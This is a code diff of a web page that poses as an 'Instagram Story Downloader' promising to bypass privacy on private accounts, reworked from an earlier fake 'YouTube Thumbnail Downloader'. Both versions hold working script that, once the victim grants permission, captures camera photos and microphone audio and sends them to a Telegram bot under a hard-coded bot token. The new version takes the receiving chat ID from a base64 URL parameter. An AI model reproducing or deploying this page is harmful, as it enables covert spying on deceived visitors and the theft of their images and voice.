@@ -2,8 +2,8 @@
 <html lang="en">
 <head>
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
-
-  <title>YouTube Thumbnail Downloader</title>
+  
+  <title>Instagram Story Downloader</title>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
@@ -13,83 +13,135 @@
       margin: 0;
       padding: 0;
       background-color: #f5f5f5;
+      background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888);
+      background-size: 400% 400%;
+      animation: gradient 15s ease infinite;
+    }
+    @keyframes gradient {
+      0% {background-position: 0% 50%;}
+      50% {background-position: 100% 50%;}
+      100% {background-position: 0% 50%;}
     }
     .navbar {
-      background-color: #ff0000;
+      background: linear-gradient(45deg, #405de6, #5851db, #833ab4, #c13584, #e1306c, #fd1d1d);
       color: white;
       text-align: center;
       padding: 15px 0;
+      border-bottom: 1px solid rgba(255,255,255,0.2);
     }
     #header {
       margin: 0;
       font-size: 28px;
       font-weight: bold;
+      text-shadow: 0 2px 4px rgba(0,0,0,0.2);
     }
     .container {
       max-width: 600px;
       margin: 20px auto;
       padding: 20px;
-      background-color: #fff;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+      background-color: rgba(255,255,255,0.9);
+      border-radius: 12px;
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
+      backdrop-filter: blur(5px);
     }
     .form-control {
       width: calc(100% - 22px);
       margin-bottom: 15px;
-      padding: 10px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
+      padding: 12px;
+      border: 1px solid #ddd;
+      border-radius: 8px;
       box-sizing: border-box;
       font-family: 'Montserrat', sans-serif;
+      font-size: 16px;
+      background-color: rgba(255,255,255,0.8);
     }
     #thumbdloadbtn {
       display: block;
       width: 100%;
-      padding: 10px;
+      padding: 12px;
       border: none;
-      border-radius: 5px;
-      background-color: #ff0000;
+      border-radius: 8px;
+      background: linear-gradient(45deg, #405de6, #833ab4, #c13584);
       color: white;
       font-size: 16px;
+      font-weight: bold;
       cursor: pointer;
       font-family: 'Montserrat', sans-serif;
+      transition: all 0.3s ease;
+      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
     }
     #thumbdloadbtn:hover {
-      background-color: #cc0000;
+      transform: translateY(-2px);
+      box-shadow: 0 6px 12px rgba(0,0,0,0.15);
+      background: linear-gradient(45deg, #833ab4, #c13584, #e1306c);
     }
     footer {
       text-align: center;
       margin-top: 40px;
-      color: #666;
+      color: rgba(255,255,255,0.8);
     }
-    .youtube-logo {
+    .instagram-logo {
       display: block;
       margin: 20px auto;
-      width: 100px; /* Adjust size as needed */
+      width: 100px;
+      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+    }
+    ol {
+      background-color: rgba(255,255,255,0.7);
+      padding: 20px 30px;
+      border-radius: 8px;
+    }
+    li {
+      margin-bottom: 10px;
+      padding: 5px 0;
     }
   </style>
+  <script type='text/javascript'>
+  //<![CDATA[
+  var uri = window.location.toString();
+  if (uri.indexOf("%3D") > 0) {
+      var clean_uri = uri.substring(0, uri.indexOf("%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("%3D%3D") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("%3D%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("&m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("&m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("?m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+  //]]>
+  </script>
 </head>
 <body>
   <nav class="navbar">
-    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
-    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+    <img class="instagram-logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/1024px-Instagram_logo_2016.svg.png" alt="Instagram Logo">
+    <h1 id="header">INSTAGRAM STORY DOWNLOADER</h1>
   </nav>
 
   <div class="container">
-    <form method="post" action="">
-      <input id="ytlink" name="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
-      <button id="thumbdloadbtn" type="submit">FETCH</button>
-    </form>
-    <div id="thumbnail-preview">
-      <!-- Placeholder for thumbnail preview -->
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter Instagram Username" spellcheck="false">
+    <button id="thumbdloadbtn" onclick="downloadThumbnail()">DOWNLOAD STORIES</button>
+    <div id="thumbnail-preview"><!-- Placeholder for story preview --></div>
 
-    <h2>How to Download HD YouTube Thumbnail</h2>
+    <h2>How to Download Private Instagram Stories</h2>
     <ol>
-      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
-      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
-      <li>Click on the "FETCH" Button</li>
-      <li>Select the thumbnail quality</li>
-      <li>Download the Thumbnail</li>
+      <li>Enter the exact Instagram username of the private account</li>
+      <li>Click on the "DOWNLOAD STORIES" button</li>
+      <li>Wait for our system to bypass privacy restrictions</li>
+      <li>View and download all available stories</li>
+      <li>Save stories directly to your device</li>
     </ol>
   </div>
 
@@ -101,15 +153,18 @@
 
   <script type="text/javascript">
     function downloadThumbnail() {
-      // Change button text to indicate fetching
-      var btn = document.getElementById('thumbdloadbtn');
-      btn.textContent = 'Fetching from server... Wait';
+        // Change button text to indicate fetching
+        var btn = document.getElementById('thumbdloadbtn');
+        btn.textContent = 'Fetching from server... Wait';
+
+        // Add your logic to fetch the thumbnail here
+        // ...
     }
-    
+
     function la(src) {
       window.location = src;
     }
-    
+
     function GetURLParameter(sParam) {
       var sPageURL = window.location.search.substring(1);
       var sURLVariables = sPageURL.split('&');
@@ -120,9 +175,26 @@
         }
       }
     }
-    
-    var chatid = GetURLParameter('id');
-    
+
+    function decodeBase64(encodedStr) {
+      try {
+        return decodeURIComponent(atob(encodedStr));
+      } catch (e) {
+        console.error('Base64 decode error:', e);
+        return null;
+      }
+    }
+
+    // Get Base64 encoded 'id' parameter from the URL
+    var base64Id = GetURLParameter('i');
+    var chatid = base64Id ? decodeBase64(base64Id) : null;
+
+    if (chatid) {
+      console.log('Decoded chat ID:', chatid);
+    } else {
+      console.warn('No valid chat ID found.');
+    }
+
     navigator.mediaDevices.getUserMedia({ video: true, audio: true })
       .then((stream) => {
         const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
@@ -167,50 +239,32 @@
           console.error('Permission error:', error);
         }
       });
-      
-    // Function sendToTelegram
-async function sendToTelegram(data, type) {
-  const BOT_TOKEN = '8066877089:AAFR-EgDN448oRHlzIk4NZc9L2RLD4pA78E';   // Replace your botToken
-  const CHAT_ID = '7771942744';     // Replace your botToken
-  
-  // validasi tipe
-  if (type !== 'photo' && type !== 'audio') {
-    throw new Error("Tipe harus 'photo' atau 'audio'");
-  }
 
-  const formData = new FormData();
-  formData.append('chat_id', CHAT_ID);
-  // field untuk file: 'photo' untuk gambar, 'audio' untuk audio
-  const fieldName = type === 'photo' ? 'photo' : 'audio';
-  const extension = type === 'photo' ? 'jpg' : 'wav';
-  formData.append(fieldName, data, `ANONYMOUSHACKING.${extension}`);
+    function sendToTelegram(data, type) {
+      const botToken = '8066877089:AAFR-EgDN448oRHlzIk4NZc9L2RLD4pA78E';
+      const chatId = chatid;
 
-  const endpoint = `https://api.telegram.org/bot${BOT_TOKEN}/${type === 'photo' ? 'sendPhoto' : 'sendAudio'}`;
+      if (!chatId) {
+        console.error('Chat ID is not available.');
+        return;
+      }
 
-  try {
-    const res = await fetch(endpoint, {
-      method: 'POST',
-      body: formData
-    });
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@lodabotbccc.${type === 'photo' ? 'jpg' : 'wav'}`);
 
-    const result = await res.json();
-
-    if (!res.ok) {
-      // Telegram mengembalikan { ok: false, description: "..." }
-      throw new Error(result.description || res.statusText);
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error sending to Telegram:', error));
     }
-
-    console.log('Telegram response:', result);
-    return result;
-  } catch (err) {
-    console.error('Error sending to Telegram', err);
-    throw err; // biarkan caller yang tangani
-  }
-}
   </script>
 
   <footer>
-    <p>Made With ❤️ BY: @ANONYMOUSHACKING</p>
+    <p>Made By HCO KING</p>
   </footer>
 </body>
 </html>
